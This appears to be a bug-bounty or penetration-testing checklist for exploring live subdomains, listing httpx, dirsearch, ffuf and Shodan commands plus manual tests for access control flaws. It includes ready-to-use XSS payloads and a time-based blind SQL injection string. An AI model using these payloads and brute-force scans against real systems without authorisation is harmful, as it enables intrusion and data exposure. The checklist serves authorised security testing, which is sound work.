# 🌍 Live Hosts Analysis & Testing (200 OK)

This document details the **manual exploration of live subdomains** and **security testing** for **XSS, SQLi, IDOR, and unauthorized access.**

---

## **1️⃣ Exploring Live Subdomains Based on Title & Tech Detection**

Since we are testing each subdomain one by one, we will **prioritize them based on technology stack and title detection**.

### **Gathering Title & Technologies of Live Subdomains**

```bash
cat httpx_200.txt | httpx -title -tech-detect -o live_subdomains_info.txt
```

✅ **Helps prioritize subdomains based on technology stack.**

### **Manually Open Each Subdomain & Explore**

Since subdomains are being tested one by one, open each manually and inspect pages, forms, and hidden functionalities.

**Once opened, manually test the following:**

- **Check for exposed directories, admin panels, and authentication forms.**
- **Look for error messages, debug logs, and sensitive information leaks.**

### \*\*Bruteforce Discovered Paths with ****`dirsearch`**** & \*\***`ffuf`**

```bash
dirsearch -u "https://target.com/discovered_path" -e php,html,js,json -t 50 --simple-report dirsearch_results.txt
ffuf -u "https://target.com/FUZZ" -w custom_wordlist.txt -mc 200 -o ffuf_results.txt
```

✅ **Only bruteforce paths discovered manually during exploration.**

```bash
cat httpx_200.txt | xargs -I {} curl -s {}/robots.txt | tee robots_results.txt
```

✅ **Extracts disallowed directories that might contain sensitive information.**

### \*\*Bruteforce Hidden Paths with ****`dirsearch`**** & \*\***`ffuf`**

```bash
dirsearch -l httpx_200.txt -e php,html,js,json -t 50 --simple-report dirsearch_results.txt
ffuf -u "https://FUZZ.target.com/FUZZ" -w common_wordlist.txt -mc 200 -o ffuf_results.txt
```

✅ **Finds hidden directories, admin panels, and sensitive files.**

### **Inject XSS in Form Fields**

```html
<svg/onload=confirm()> {{7*7}}
">"'><svg onload=alert('XSS')> {{7*7}}
<script>alert()</script> {{7*7}}
<img src=x onerror=confirm``> {{7*7}}
```

✅ **Tests for XSS vulnerabilities in login, signup, and password reset fields.**

Manually test SQLi payloads:

```sql
id = 1'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```

✅ **Tests for SQL injection vulnerabilities in live subdomains.**

- **Modify session tokens and test direct access.**
- **Use Burp Suite to inspect API responses for access control issues.**

### **Favicon Analysis for Technology Fingerprinting**

```bash
cat httpx_200.txt | httpx -favicon -o favicon_hashes.txt
shodan search "http.favicon.hash:{}"
```

✅ **Identifies underlying technologies based on favicon hash.**

### **Authentication Testing**

- **Refer to the following pages for manual authentication testing:**
  - **[Register & Signup](register_testing.md)**
  - **[Login & Auth](login_testing.md)**
  - **[Reset & Forgot Password](reset_testing.md)**
  - **[2FA & OTP](2fa_testing.md)**
  - **[API & XML Testing](api_xml_testing.md)**


